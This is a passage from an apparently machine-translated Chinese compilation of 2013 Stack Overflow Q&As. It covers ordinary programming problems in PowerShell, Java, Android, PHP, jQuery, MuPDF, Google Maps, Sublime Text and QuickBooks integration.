                    ->scalarNode('es')->defaultValue('es_ES')->end()//language=>region
                    ->scalarNode('en')->defaultValue('en_GB,en_US')->end()//
                    ->scalarNode('fr')->defaultValue('fr_FR,fr_BG')->end()//                
                ->end()
            ->end()//end arrayNode('_locale')
            ->scalarNode('encoding')->defaultValue('UTF-8')->end()
        ->end()
    ->end()//end arrayNode('backend') 
```

捆绑包的配置参数中的清洁器：

```
fer_cave.backend: 
  _locale: {es: [es_ES],en: [en_GB,en_US],fr: [fr_FR,fr_BG]}
  encoding: UTF-8
cave.frontend: 
  _locale: {es: es_ES}    
  encoding: UTF-8 
```

现在我可以使用 get、post 或浏览器配置来设置 Session _locale 和语言。

希望我的英语清楚，对不起，因为不断地编辑文本。

# arrays - Powershell - 组合数组

> ID：14903970
> 
> 赞同：5
> 
> 时间：2013-02-15T21:54:33.627
> 
> 标签：arrays, powershell

我是 powershell 新手，需要帮助。我的第一个工作脚本是自动化 AD 环境中的新用户和术语用户。

我们的 Peoplesoft 系统每天将进行一次 CSV 转储。我使用`Import-CSV`并创建了 3 个数组（新的、长期的和已处理的）。

我遇到的麻烦是，一旦我遍历所有用户并尝试将其放回文件中，就组合 3 个数组。代码在行处中断`$New += $Term`。我相信这是因为在我的测试文件中每种用户类型（新的、长期的和已处理的）只有 1 条记录（我知道，添加更多用户......不能。这可能是任何人的真实世界结果特定的日子）。下面是我的示例代码：

```
#Get Credentials from user
$c = Get-Credential

#Get Date for $Term array population
$e = Get-Date -format M/d/yyyy

#Set file location and variable for said file
$File = "c:\users\nmaddux\desktop\adduserstuff\test.csv"

#Import record sets for New and Term users
$New   = @()
$Term  = @()
$Procd = @()
$New   = Import-Csv $File | Where-Object {
           $_.TermDate -eq "" -and $_.LastName -ne "" -and $_.Processdate -eq ""
         }
$Term  = Import-Csv $File | Where-Object {
           $_.TermDate -ne "" -and $_.Processdate -eq "" -and $_.TermDate -le $e
         }
$Procd = Import-Csv $File | Where-Object { $_.Processdate -ne "" }

#Process both new and term users provided there are records to process for each
If ($New -ne $NULL -and $Term -ne $NULL) {
  # Some code to process users
}

$new += $term
$new += $Procd
$new | Export-Csv $file -NoTypeInformation -ErrorAction SilentlyContinue 
```

所以它会导出但只是部分结果。

> 错误 - 方法调用失败，因为 [System.Management.Automation.PSObject] 不包含名为“op_Addition”的方法。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-15T22:02:31.400

如果`Import-Csv`只返回 1 个结果，那么假设变量不是数组是正确的，那么连接将失败。这不会因为您已使用 预初始化变量而改变`@()`。事实上，这一步是不必要的。

要强制将结果视为数组，您可以将整`Import-Csv`行包装在 中`@()`，或者之后执行类似的操作。

```
$new = @( Import-Csv $File | Where-Object {...} )
# or
$new = Import-Csv $File | Where-Object {...}
$new = @($new) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T21:36:48.220

所以你要导入同一个 CSV 文件 3 次？将它导入一次然后将数组设置为过滤它的“视图”不是更好吗？

有点像这样。您还应该能够使用每个数组中的“计数”值来说明是否返回了 1 个或多个结果。

```
#Get Credentials from user
$c = Get-Credential

#Get Date for $Term array population
$e = Get-Date -format M/d/yyyy

#Set file location and variable for said file
$File = "c:\users\nmaddux\desktop\adduserstuff\test.csv"

#Import record sets for New and Term users
[array]$New
[array]$Term
[array]$Procd

[array]$Import = Import-Csv $File
[array]$New = $Import | ? {$_.TermDate -eq "" -and $_.LastName -ne "" -and $_.Processdate -eq ""}
[array]$Term = $Import | ? {$_.TermDate -ne "" -and $_.Processdate -eq "" -and $_.TermDate -le $e}
[array]$Procd = $Import | ? {$_.Processdate -ne ""}

#Process both new and term users provided there are records to process for each
if (($New.Count -gt 0) -and ($Term.Count -gt 0))
{
    # Some code to process users
}

$new += $term
$new += $Procd
$new | Export-Csv $file -NoTypeInformation -ErrorAction SilentlyContinue 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-08T20:12:20.647

我知道我迟到了这个讨论，但是对于其他人来说......由于您已经将 $new 定义为一个空数组，因此当您从 csv 导入时，您希望将输出添加到您的预定义数组，而不是将其设置为等于 import-csv 的输出。

```
$new = @()
$new += Import-Csv $File | Where-Object {
           $_.TermDate -eq "" -and $_.LastName -ne "" -and $_.Processdate -eq ""
         } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-16T04:06:37.060

您还可以通过类型转换变量来强制类型：

```
$array = @()
$array = gci test.txt
$array.GetType()

[array]$array = @()
$array = gci test.txt
$array.GetType() 
```

IsPublic IsSerial Name BaseType
-------- -------- ---- --------
True True FileInfo System.IO.FileSystemInfo
True True Object[] System.Array

# java - Java程序崩溃Matlab

> ID：14903971
> 
> 赞同：2
> 
> 时间：2013-02-15T21:54:43.670
> 
> 标签：java, matlab, crash

我倾向于一直打开 Matlab，以防我需要做一些快速计算。但是最近我一直在用 Java 编程，并且具有令人难以置信的一致性，如果我断断续续地运行我的 Java 应用程序一个小时左右（就像调试时经常做的那样），那么 Matlab 会抛出一些错误并且变得无响应。

该错误往往是 Java 内存不足错误，但我也看到了其他更奇特的错误。

这是正常/已知的事情吗？无论哪种方式，有什么方法可以防止我的 Java 工作干扰我的 Matlab 实例？

请注意，这甚至不是我的 Java 应用程序所独有的，我下载的几乎所有 Java 应用程序最终都会导致相同的问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T22:07:11.593

增加 MATLAB 中的 Java 堆大小，以免 MATLAB 崩溃。

引用的作品：http: [//blogs.mathworks.com/community/2010/04/26/controlling-the-java-heap-size/](http://blogs.mathworks.com/community/2010/04/26/controlling-the-java-heap-size/)

# tcp - 两个程序监听一个套接字

> ID：14903973
> 
> 赞同：0
> 
> 时间：2013-02-15T21:55:08.510
> 
> 标签：tcp, port, sharing, multiplayer

**问题 我的**
一些朋友玩的游戏最多有 4 个玩家参与。我正在尝试编写一个程序，该程序将允许第五个人监控游戏中发生的事情，而无需实际参与游戏。

**背景**
游戏的多人部分功能如下：
一名玩家被指定为“主机”。所有其他玩家通过输入主机的 IP 地址连接到主机。主机的机器负责控制游戏的AI。当游戏中发生事件时，游戏的主机副本将事件发送给其他玩家的每个游戏（客户端）。如果客户端玩家执行一个动作，他们的游戏会将动作发送给主机，主机又将它发送给其他玩家，这样任何玩家的动作对所有其他玩家都是可见的。主机和客户端都使用游戏配置文件中预定义的单个 TCP 端口（例如：端口 58282）。该游戏是一款即时战略游戏（非回合制）。

**约束**
1\. 游戏机制不可更改。它是预编译的，无法更改多人游戏机制。2.游戏使用TCP在服务器和客户端之间进行通信

**问题**
有没有办法让一个单独的程序运行在主机或客户端计算机上监听游戏的端口（当游戏进行时）？我知道 TCP 只允许每个 ip 地址的每个端口一个套接字，因此让游戏和单独的程序同时监听同一个端口是有问题的。假设我在游戏前启动外部应用程序并让应用程序监听游戏的端口，有没有办法让应用程序通过游戏端口听到主机，获取/复制该信息，然后将其转发到游戏？（有点像当地的中间人）

**终极问题**

考虑到限制，这可能吗？我会以最好的方式去做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:59:11.693

我先回答第二个问题。你没有走正确的路。正确的方法是在服务器中实现一些功能，以允许单独的“客户端”连接到另一个端口以定期收集统计信息。

> 有没有办法让应用程序通过游戏端口听到主机，获取/复制该信息，然后将其转发到游戏？

你不需要做中间人。您可以进行简单的数据包捕获，使用无处不在的`tcpdump`或`wireshark`。例如，要捕获该 TCP 端口上的所有内容：

```
tcpdump -n -w capture.pcap tcp port 58282 
```

其他应用程序永远不会知道您捕获了数据。

# android - Android布局：即使宽度/高度为0，重量也不起作用

> ID：14903977
> 
> 赞同：2
> 
> 时间：2013-02-15T21:55:25.467
> 
> 标签：android, android-layout

FrameLayout 的 layout_weight 是 0.13 但看起来比它大得多。为什么？很多推荐都是 android:layout_height="0dp"，但它没有帮助。

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:orientation="vertical"
              android:layout_width="match_parent"
              android:layout_height="match_parent" android:background="@drawable/background" android:weightSum="1">

    <FrameLayout
            android:layout_width="match_parent"
            android:layout_height="0dp" android:background="@drawable/bar_background" android:layout_weight="0.13">
        <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/header"
                android:id="@+id/textView" android:layout_gravity="center" android:textSize="@dimen/header_size"
                android:textColor="#ffffff" android:layout_marginTop="@dimen/header_margin_top" />
    </FrameLayout>
    <LinearLayout
            android:orientation="vertical"
            android:layout_width="match_parent"
            android:layout_height="match_parent">
        <EditText
                android:inputType="text"
                android:layout_width="match_parent"
                android:layout_height="48dp"
                android:id="@+id/textEdit"/>
        <ImageView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:id="@+id/imageView" android:layout_gravity="center" android:src="@drawable/separator"
                android:scaleType="fitXY"/>
        <ListView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:id="@+id/listView" android:layout_gravity="center" android:choiceMode="singleChoice"
                android:scrollingCache="false" android:cacheColorHint="#00000000"/>
    </LinearLayout>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:57:21.753

我*认为*这可能是因为 FrameLayout 的兄弟姐妹都没有重量。尝试向您的内部 LinearLayout 添加权重（可能是 0.87），看看是否能解决问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T10:36:27.457

Sorry, looks like it's IntelliJ IDEA's preview bug. All is good on the device. Thanks all.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T22:05:41.187

我已经尝试过您的布局，并且在为兄弟 LinearLayout 设置了 0.87 的权重和 0dp 的 layout_height 之后，它对我来说效果很好。也许您在 FrameLayout 中为内部 TextView 设置的尺寸太大了？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-16T00:23:53.907

```
android:textSize="@dimen/header_size" 
```

我认为因为这个太大所以它迫使你 FrameLayout 比它应该大

# java - 无法为可执行 jar 配置日志记录

> ID：14903978
> 
> 赞同：14
> 
> 时间：2013-02-15T21:55:26.517
> 
> 标签：java, maven, logging, netbeans, jar

这与其他[问题](https://stackoverflow.com/questions/10370989/how-to-configure-logging-when-running-a-jar)类似，尽管我已经将其`logging.properties`放入可执行 jar 并且不起作用。

我有一个类（ReportGenerator），它具有以下内容：

```
 Logger logger = Logger.getLogger(ReportGenerator.class.getName());
 logger.log(Level.INFO, "LOG THIS"); 
```

我正在使用 Netbeans，所以我将`logging.properties`文件放在路径中`src/main/resources`。它有这个（除其他外）：

```
# default file output is in user's home directory.
java.util.logging.FileHandler.pattern = /my/folder/reports.log
java.util.logging.FileHandler.limit = 50000
java.util.logging.FileHandler.count = 10
java.util.logging.FileHandler.formatter = java.util.logging.SimpleFormatter

# Limit the message that are printed on the console to INFO and above.
java.util.logging.ConsoleHandler.level = OFF
java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter

############################################################
# Facility specific properties.
# Provides extra control for each logger.
############################################################

# For example, set the com.xyz.foo logger to only log SEVERE
# messages:
com.mypackage.ReportGenerator.level = ALL 
```

jar 是使用 Maven 生成的，解压后我可以看到它`logging.properties`位于 jar 的主文件夹中。连同`com`我的班级所在的文件夹。

```
-com
  -mypackage
      -ReportGenerator
logging.properties
...other things 
```

当我从控制台运行时：

```
java - jar MyReportsJar.jar 
```

它通过控制台向我显示日志。我想将它记录到我在`logging.properties.`

我究竟做错了什么？`java.util.logging.config.file`如果不设置 JVM参数，我该怎么做？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-02-18T20:35:07.013

经过几天的反对并阅读了互联网上的许多资源后，我想出了这个解决方案：

我必须在程序中更改[LogManager](https://docs.oracle.com/javase/7/docs/api/java/util/logging/LogManager.html)的日志记录属性。我可以像这样使用`logging.properties`打包的文件`.jar`：

```
LogManager.getLogManager().readConfiguration(ReportGenerator.class.getClassLoader().getResourceAsStream("logging.properties")); 
```

然后我可以像以前一样获取记录器并记录：

```
 Logger logger = Logger.getLogger(ReportGenerator.class.getName());
 logger.log(Level.INFO, "LOG THIS"); 
```

但我发现您可以`logging.properties`在运行时指定另一个文件非常有用，所以我的最终代码是这样的：

```
 String logFile = System.getProperty("java.util.logging.config.file");
        if(logFile == null){
            LogManager.getLogManager().readConfiguration(ReportGenerator.class.getClassLoader().getResourceAsStream("logging.properties"));
        }                
        Logger logger = Logger.getLogger(ReportGenerator.class.getName());
        logger.log(Level.INFO, "LOG THIS"); 
```

这样，如果我这样执行 jar：

```
java -jar MyReportsJar.jar 
```

它使用内部`logging.properties`文件。

但如果我执行：

```
java -Djava.util.logging.config.file=<external-logging.properties> -jar MyReportsJar.jar 
```

它使用外部`logging.properties`文件。

# c - 强制 MuPDF 也绘制页面背景

> ID：14903979
> 
> 赞同：1
> 
> 时间：2013-02-15T21:55:28.963
> 
> 标签：c, pdf, 2d, mupdf

当我调用`fz_run_page()`MuPDF 时，仅将实际的 PDF 对象绘制到像素图上

**（例如文本、图像、矢量图形等）**。

它不绘制页面边界框并用静态颜色（例如白色）填充它。有没有办法让 MuPDF 也绘制页面背景？

我知道我可以`fz_clear_pixmap_with_value()`在调用之前手动将背景设置为静态颜色`fz_run_page().`但是一旦旋转开始起作用，这个解决方案就会出现问题，因为在旋转的 PDF 页面的边界处会有空的未使用空间。因此，如果有可能让 MuPDF 先绘制页面的边界框，将其背景填充为静态颜色，然后在其上绘制 PDF 对象（如文本等），那将非常有帮助。

这有可能吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-21T16:37:05.680

以防万一有人遇到同样的问题。解决方案是简单地清除像素图，然后在调用 fz_run_page() 之前自己绘制白色背景。比如像这样：

```
dev = fz_new_draw_device(ctx, pixmap);
path = fz_new_path(ctx);
fz_moveto(ctx, path, 0, 0);
fz_lineto(ctx, path, 0, height);
fz_lineto(ctx, path, width, height);
fz_lineto(ctx, path, width, 0);
fz_closepath(ctx, path);
fz_fill_path(dev, path, 0, ctm, fz_device_gray, &constant_0, 1.0f);
fz_free_path(ctx, path);
fz_run_page(doc, page, dev, ctm, &cookie);
fz_free_device(dev); 
```

将 fz_bound_page() 的结果用于“宽度”和“高度”是很重要的，因为它们包含页面的真实、未舍入的尺寸。

如果您不使用转换矩阵，您也可以使用 0xff 预填充像素图。

# diff - 为什么我从 Sublime Text 2 中的 diff 命令得到不同的结果

> ID：14903980
> 
> 赞同：0
> 
> 时间：2013-02-15T21:55:39.573
> 
> 标签：diff, sublimetext2

我正在协调一组文本文件，其中许多具有完全相同的内容。使用 Sublime Text 2，我可以通过以下两种方式之一来区分这些文件（可能还有更多，我不知道）

1.  打开这两个文件，*右键单击*一个，然后选择`Diff with Tab....`
2.  在没有打开任何选项卡的情况下，*右键单击*侧边栏上我的文件夹结构中的文件并选择`Diff with File in Project...`，从那里我选择文件到`diff`

对于包含相同内容的两个文件，**选项 1**会在底部闪烁一条消息，指示`no difference`. **然而，选项 2**会打开一个新的差异结果文件，并指示文件 2 的全部内容应替换为文件 1。

* * *

例如，这里是选项 2 对某些测试文件的结果

```
 --- C:\path\to\test\file\a\test_b.txt 
    +++ C:\path\to\test\file\b\test_a.txt 
    @@ -1,8 +1,8 @@
    -This
    -is
    -a
    -test
    -file
    -to
    -test
    -diff
    +This
    +is   
    +a    
    +test    
    +file    
    +to    
    +test    
    +diff 
```

* * *

这是我如何使用差异的问题吗，即我是否误解了差异输出中应该返回的内容？

**上面选项 1**和**选项 2**在 Sublime Text 2 diff 如何区分这两个文件方面有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:00:26.057

这可能是因为通过将文件添加到项目中更改了行尾 (CR/LF) 吗？

# google-maps-api-3 - 在鼠标单击时绘制 100 像素的多边形

> ID：14903981
> 
> 赞同：-2
> 
> 时间：2013-02-15T21:55:39.067
> 
> 标签：google-maps-api-3

我需要在每个缩放级别上单击 Google 地图（阿姆斯特丹，纬度 52，lng 4）的任何地方绘制一个 100x100 屏幕像素的方形多边形，并在多边形的中心使用 e.latlng。我尝试使用 fromLatLngToPoint、fromPointToLatLng、比例和 worldCoordinates 来计算它，但我无法绘制多边形。如果有人喜欢这个谜题，我会非常感谢这个解决方案。（我想以此作为一个简单的开始，将多边形编辑为更复杂的形状，而不是使用 DrawingManager）

我试过了：

```
google.maps.event.addListener(map, 'click', function(e) {
var scale = Math.pow(2, map.getZoom());
var nw = new google.maps.LatLng(map.getBounds().getNorthEast().lat(),map.getBounds().getSouthWest().lng());
var worldCoordinateNW = map.getProjection().fromLatLngToPoint(nw);
var worldCoordinate = map.getProjection().fromLatLngToPoint(e.latLng);
var deX = Math.floor((worldCoordinate.x - worldCoordinateNW.x) * scale);
var deY = Math.floor((worldCoordinate.y - worldCoordinateNW.y) * scale);

// so far so good, deX and deY give the centerpixel

var deNW = map.getProjection().fromPointToLatLng(new google.maps.Point(deX-50,deY-50));         
var deNO = map.getProjection().fromPointToLatLng(new google.maps.Point(deX+50,deY-50));
var deZO = map.getProjection().fromPointToLatLng(new google.maps.Point(deX+50,deY+50));
var deZW = map.getProjection().fromPointToLatLng(new google.maps.Point(deX-50,deY+50));

var dePathArray = [deNW, deNO, deZO, deZW]; 
deObjectNew = new google.maps.Polygon({
    paths: dePathArray,                         
    strokeColor: '#000000',
    strokeWeight: 1,
    fillColor: "#FF0000",
    fillOpacity: 0.3,
}); 
deObjectNew.setMap(map); 
```

});

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T15:24:48.670

知道了：

```
 var deNW = deKaart.getProjection().fromPointToLatLng(new google.maps.Point((deX-50)/scale+worldCoordinateNW.x,(deY-50)/scale+worldCoordinateNW.y));         
        var deNO = deKaart.getProjection().fromPointToLatLng(new google.maps.Point((deX+50)/scale+worldCoordinateNW.x,(deY-50)/scale+worldCoordinateNW.y));
        var deZO = deKaart.getProjection().fromPointToLatLng(new google.maps.Point((deX+50)/scale+worldCoordinateNW.x,(deY+50)/scale+worldCoordinateNW.y));
        var deZW = deKaart.getProjection().fromPointToLatLng(new google.maps.Point((deX-50)/scale+worldCoordinateNW.x,(deY+50)/scale+worldCoordinateNW.y)); 
```

# php - 如何使用 php / mysql 将 POST jquery ajax 调用发送到服务器以获得“收藏夹”按钮？

> ID：14903984
> 
> 赞同：1
> 
> 时间：2013-02-15T21:55:54.063
> 
> 标签：php, mysql, ajax, jquery

我希望将非常简单的数据发布到一个名为“postData.php”的“收藏”按钮的页面上，我已经了解如何处理 POST 数据并将其发送到服务器。我不确定的是如何设置 jquery .ajax 函数以使其工作。

我明白会有

```
$('#myDiv').click(function(){} 
```

对于函数调用，但我在函数中包含什么？您的示例中发送的数据可以是通用的，因为我只需要更好地理解 jquery-ajax。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:59:02.800

有一个快捷功能叫做`$.post()`.

```
$.post('postData.php', { name: "John", time: "2pm" }, function(data) {
  $('.result').html(data);
}); 
```

否则，这就是`$.ajax()`函数的使用方式。

```
$.ajax({
  type: "POST",
  url: 'postData.php',
  data: data,
  success: success,
  dataType: dataType
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-16T02:58:59.157

对于事件本身，假设 jQuery 1.7X 或更高版本。

```
$(document).on("click", "#myDiv", function(){
    $.post("filethatacceptspostdata.php", {'data':'object', item2:'data', item3:'data'}, function(myreturndata){
        //Whatever you want to do with myreturndata here.
        //I would have the filethatacceptspostdata.php file output a number 1 if the data was successfully stored.
    });
}); 
```

# php - 读取制表符和换行符分隔的（多维）平面文件数据库

> ID：14903989
> 
> 赞同：2
> 
> 时间：2013-02-15T21:56:07.373
> 
> 标签：php, database, file, flat-file

抱歉，如果这可能是一个简单的问题，我之前没有使用过平面文件数据库并且发现这非常不直观。

我有一个平面文件、制表符`\t`和`\n`新行分隔的数据库，如下所示：

```
Sebastian Ingrosso  Kidsos (Wippenberg Mix) 2F32829628  Electro
Avicii  Silhouettes 2F47987574 House 
```

（两行仅用于示例）。我希望能够遍历每一行，封装由`\t`标签内的制表符分隔的每个元素`span`，然后移动到下一行，最好将每个新行封装在一个`<li>`元素中。

我有这个开始，它不添加跨度或李：

```
function display_tracklist($max) {
$db = fopen('db/db.txt', 'r');
$row = 0;
while (($tracks = fgetcsv($db, "\n")) !== FALSE) {
    if ($max > count($tracks)) {
        $max = count($tracks);
    }
    $row++;
    for ($index=0; $index < $max; $index++) {
        echo "<li>" . $tracks[$index] . "</li>";
    }
}
fclose($db); 
```

}

处理此任务的最佳方法是什么？通常，我会使用 SQL 数据库来完成此操作，从而使事情变得更加直观，但这不是这里的选择。我想到了嵌套的 foreach 循环等，到目前为止还没有运气。

最终结果应该是： `<li><span>Sebastian Ingrosso</span> <span>Kidsos (Wippenberg Mix)</span> <span>2F32829628</span> <span>Electro</span></li> <li><span>Avicii</span> <span>Silhouettes</span> <span>2F32829628</span> <span>House</span></li>`

等等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:36:09.443

假设你的数据和我的一样`$data`，这看起来就像给了你想要的；

```
$data = "Sebastian\tIngrosso\tKidsos (Wippenberg Mix)\t2F32829628\tElectro\nAvicii\tSilhouettes\t2F47987574\tHouse";
foreach ((array) explode("\n", $data) as $lines) {
    print "<li>";
    foreach ((array) explode("\t", $lines) as $line) {
        print "<span>{$line}</span>";
    }
    print "</li>\n";
} 
```

输出;

```
<li><span>Sebastian</span><span>Ingrosso</span><span>Kidsos (Wippenberg Mix)</span><span>2F32829628</span><span>Electro</span></li>
<li><span>Avicii</span><span>Silhouettes</span><span>2F47987574</span><span>House</span></li> 
```

# java - 如何进行身份验证以访问我们自己的数据？

> ID：14903992
> 
> 赞同：1
> 
> 时间：2013-02-15T21:56:11.647
> 
> 标签：java, quickbooks, intuit-partner-platform, quickbooks-online

我正在尝试使用 IDS 从基于 Java 的 Web 应用程序访问我们自己在 QBO 中的数据。我找到了一些示例（例如 ipp-java-devkit 中的示例），并且已经组装了大约 20 行代码来进行连接和身份验证……但我还没有任何工作。这些文档似乎是围绕构建一个 3rd 方应用程序销售给其他公司，以便他们可以从应用程序访问自己的数据。我理解在这种情况下需要额外的安全性，但我肯定不需要在 Intuit App Store 中创建应用程序来访问我们自己的数据吗？

有谁知道如何做到这一点的示例或教程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T13:58:08.617

根据 Intuit 的[常见问题解答](https://ipp.developer.intuit.com/0010_Intuit_Partner_Platform/0025_Intuit_Anywhere/0080_FAQ)，Intuit Anywhere/IDS 仅应用于 SaaS 应用程序（例如，您尝试向其他人销售的应用程序，这允许他们将其 QuickBooks 文件连接到您的应用程序）。

从常见问题解答：

> 问：实施 Intuit Anywhere 有哪些要求？
> 
> 答：您的应用必须：
> 
> *   成为可在浏览器中使用的 Web 应用程序，作为服务（SaaS，包括基于交易定价）出售给多个客户的产品。支持 SaaS 应用程序的移动扩展。
>     
>     
> *   在与客户一起上线之前通过安全审查。

和：

> 问：我想将我的自定义（非 SaaS、单租户）解决方案与 Intuit Anywhere 集成。> 我可以这样做吗？
> 
> 答：不是今天，但我们正在考虑。

由于您尝试构建的内容不属于该模式，因此您没有资格使用 IDS。

您应该改用 qbXML。

在我们的[QuickBooks 集成 wiki](http://wiki.consolibyte.com/wiki/doku.php/quickbooks)上，我们有一些使用 Java 连接到 QuickBooks Online 的示例。

您应该使用 Intuit[在 DESKTOP 模式下注册](http://wiki.consolibyte.com/wiki/doku.php/quickbooks_online_edition#connecting_with_the_desktop_model_of_communication)，然后您可以使用如下代码交换数据：

```
import java.net.*;
import java.io.*;
import javax.net.ssl.*;

// WARNING SUPER SLOPPY DEMO CODE - YOU SHOULD CLEAN THIS UP AND MAKE THIS PRETTY IF YOU USE IT!

public class Test {

    protected static String _appID = "134476472";

    protected static String _appLogin = "test.www.yourdomain.com";

    protected static String _connTicket = "TGT-47-1sRm2nXMVfm$n8hb2MZfVQ";

    protected static String _appURL = "https://webapps.quickbooks.com/j/AppGateway";

    /**
     * @param args
     */
    public static void main(String[] args) {

        // First, we need to sign on to QBOE
        String xml = "<?xml version=\"1.0\" ?>" + 
        "<?qbxml version=\"6.0\"?>" + 
        "<QBXML>" + 
        "   <SignonMsgsRq>" + 
        "       <SignonDesktopRq>" + 
        "           <ClientDateTime>2007-01-02T01:02:35</ClientDateTime>" + 
        "           <ApplicationLogin>" + Test._appLogin + "</ApplicationLogin>" + 
        "           <ConnectionTicket>" + Test._connTicket + "</ConnectionTicket>" + 
        "           <Language>English</Language>" + 
        "           <AppID>" + Test._appID + "</AppID>" + 
        "           <AppVer>1</AppVer>" + 
        "       </SignonDesktopRq>" + 
        "   </SignonMsgsRq>" + 
        "</QBXML>";

        String out = "";
        try {
            out = Test._doRequest(xml);
            System.out.println(out);
        }
        catch (Exception ex) {
            System.out.println("Something bad happened: " + ex.getMessage());
        }

        // Parse out the connection ticket
        String sessTicket = out.substring(291, 330);
        System.out.println("Session ticket: " + sessTicket);

        // Send an actual request
        String xml2 = "<?xml version=\"1.0\" ?>" +  
"<?qbxml version=\"6.0\"?>" +  
"<QBXML> " + 
"   <SignonMsgsRq>" + 
"       <SignonTicketRq>" +  
"           <ClientDateTime>2006-09-20T15:49:26</ClientDateTime>" +  
"           <SessionTicket>" + sessTicket + "</SessionTicket>" + 
"           <Language>English</Language> " + 
"           <AppID>" + Test._appID + "</AppID>" + 
"           <AppVer>1</AppVer>" +  
"       </SignonTicketRq>" +  
"   </SignonMsgsRq>" +  
"   <QBXMLMsgsRq onError=\"continueOnError\">" +  
"       <CustomerQueryRq requestID=\"2\" />" +  
"   </QBXMLMsgsRq>" +  
"</QBXML>";

        try {
            System.out.println(Test._doRequest(xml2));      
        }
        catch (Exception ex) {
            System.out.println("Something bad happened: " + ex.getMessage());
        }
    }

    protected static String _doRequest(String xml) throws Exception {
        String xmlOut = null;

               try 
               {
                  URL url= new URL(Test._appURL);
                  HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();
                  connection.setDoOutput(true);
                  connection.setDoInput(true);

                  connection.setRequestProperty("Content-Type", "application/x-qbxml");

                  PrintWriter out = new PrintWriter(connection.getOutputStream());
                  out.println(xml); //XML Input
                  out.close();
                  BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                  String inputLine = "";
                  xmlOut = "";
                  StringBuffer strOut = new StringBuffer();

                  while ((inputLine = in.readLine()) != null)
                  {
                      strOut.append(inputLine);
                  }
                  xmlOut = strOut.toString();

                  in.close();
               }
               catch(ConnectException conEx)
               {
                  System.out.println("Connection is unavailable. (ConnectException in SecureEnterpriseSocketSession class) " + conEx);
                  throw new Exception(conEx.getMessage());
               }
               catch(MalformedURLException malformedURLEx)
               {
                  System.out.println("Invalid URL. Cannot Connect. (MalformedURLException in SecureEnterpriseSocketSession class) " + malformedURLEx);
                  throw new Exception(malformedURLEx.getMessage());
               }
               catch(IOException ioEx)
               {
                  System.out.println("Invalid URL. Cannot Connect. (IOException in SecureEnterpriseSocketSession class) " + ioEx);
                  throw new Exception(ioEx.getMessage());
               }
               return xmlOut;
    }
} 
```